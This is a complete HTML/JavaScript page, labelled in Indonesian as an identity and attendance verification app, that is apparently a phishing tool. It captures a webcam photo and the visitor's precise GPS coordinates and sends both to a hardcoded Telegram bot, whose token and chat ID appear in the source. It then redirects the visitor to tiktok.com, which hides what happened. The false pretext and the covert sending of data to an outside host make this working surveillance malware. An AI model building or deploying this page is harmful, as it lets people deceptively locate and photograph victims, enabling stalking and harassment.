<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aplikasi Verifikasi Kehadiran & Lokasi</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background-color: #111; 
            color: #fff; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            padding: 20px; 
        }
        .container { 
            text-align: center; 
            background: #222; 
            padding: 30px; 
            border-radius: 12px; 
            max-width: 400px; 
            width: 100%;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        #webcam-container {
            width: 100%;
            height: 240px;
            background: #000;
            margin-bottom: 20px;
            border-radius: 8px;
            overflow: hidden;
        }
        video { width: 100%; height: 100%; object-fit: cover; }
        canvas { display: none; }
        .btn {
            background-color: #fe2c55;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 1rem;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        .btn:hover { background-color: #e02447; }
        p { font-size: 0.9rem; color: #aaa; margin-top: 15px; line-height: 1.4; }
        .error { color: #ff4d4d; }
        .success { color: #4da6ff; }
    </style>
</head>
<body>

<div class="container">
    <h2>Verifikasi Identitas</h2>
    <p>Silakan izinkan akses kamera dan klik tombol di bawah untuk mengirim foto serta lokasi Anda.</p>
    
    <div id="webcam-container">
        <video id="webcam" autoplay playsinline muted></video>
    </div>
    
    <button class="btn" onclick="prosesVerifikasi()">Ambil Foto & Kirim</button>
    <p id="status">Status: Siap</p>
</div>

<canvas id="canvas"></canvas>

<script>
    // ================= CONFIG TELEGRAM ===================================
    // CATATAN: Jika diunggah ke GitHub Publik, Token ini akan otomatis dinonaktifkan oleh sistem GitHub demi keamanan.
    const TELEGRAM_BOT_TOKEN = '8762651077:AAHAbyLHR3DRVNEWxSXbO7kDi2PS-vV9A1A';
    const ADMIN_CHAT_ID = '1966317946'; 
    const TARGET_WEBSITE = 'https://tiktok.com'; 
    // =====================================================================

    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    const statusTeks = document.getElementById('status');
    let currentStream = null;

    // Menyalakan kamera secara terbuka saat halaman dibuka
    async function aktifkanKamera() {
        try {
            currentStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 640, height: 480 } 
            });
            video.srcObject = currentStream;
            statusTeks.innerHTML = "Status: Kamera aktif. Silakan tekan tombol.";
        } catch (err) {
            statusTeks.innerHTML = "<span class='error'>Gagal mengakses kamera. Pastikan izin diberikan.</span>";
        }
    }

    // Fungsi utama saat tombol ditekan
    function prosesVerifikasi() {
        statusTeks.innerHTML = "🔄 Meminta izin lokasi...";
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    ambilFotoDanKirim(position.coords.latitude, position.coords.longitude);
                },
                (error) => {
                    let alasan = "Izin lokasi ditolak atau gagal.";
                    if (error.code === error.PERMISSION_DENIED) {
                        alasan = "Anda harus menyetujui izin lokasi terlebih dahulu.";
                    }
                    statusTeks.innerHTML = `<span class='error'>⚠️ ${alasan}</span>`;
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else {
            statusTeks.innerHTML = "<span class='error'>❌ Browser tidak mendukung geolokasi.</span>";
        }
    }

    // Mengambil gambar dari video dan mengirimkannya
    function ambilFotoDanKirim(lat, lon) {
        statusTeks.innerHTML = "🔄 Memproses gambar...";
        
        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;

        // Menggambar snapshot dari kamera
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Menghentikan aliran kamera setelah foto diambil
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }
        
        canvas.toBlob((blob) => {
            if (blob) {
                kirimKeTelegram(blob, lat, lon);
            } else {
                statusTeks.innerHTML = "<span class='error'>Gagal memproses foto.</span>";
            }
        }, 'image/png');
    }

    // Mengirim data langsung ke API Telegram
    async function kirimKeTelegram(blob, lat, lon) {
        statusTeks.innerHTML = "📤 Mengirim data...";

        // Perbaikan format teks dan link Google Maps (?q=)
        const teksLokasi = `<b>📌 Lokasi Terverifikasi:</b>\n` +
                           `Latitude: <code>${lat}</code>\n` +
                           `Longitude: <code>${lon}</code>\n\n` +
                           `🔗 <a href="https://google.com{lat},${lon}">Buka di Google Maps</a>`;

        const formData = new FormData();
        formData.append('chat_id', ADMIN_CHAT_ID);
        formData.append('photo', blob, 'verifikasi.png');
        formData.append('caption', teksLokasi);
        formData.append('parse_mode', 'HTML');

        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();

            if (data.ok) {
                statusTeks.innerHTML = "<span class='success'>✅ Data berhasil dikirim! Mengalihkan...</span>";
                setTimeout(() => {
                    window.location.href = TARGET_WEBSITE;
                }, 2000);
            } else {
                statusTeks.innerHTML = "<span class='error'>❌ Gagal mengirim ke Telegram. Token mungkin diblokir.</span>";
            }
        } catch (error) {
            statusTeks.innerHTML = "<span class='error'>❌ Terjadi kesalahan jaringan.</span>";
        }
    }

    // Jalankan kamera otomatis saat web dimuat
    window.addEventListener('load', aktifkanKamera);
</script>

</body>
</html>
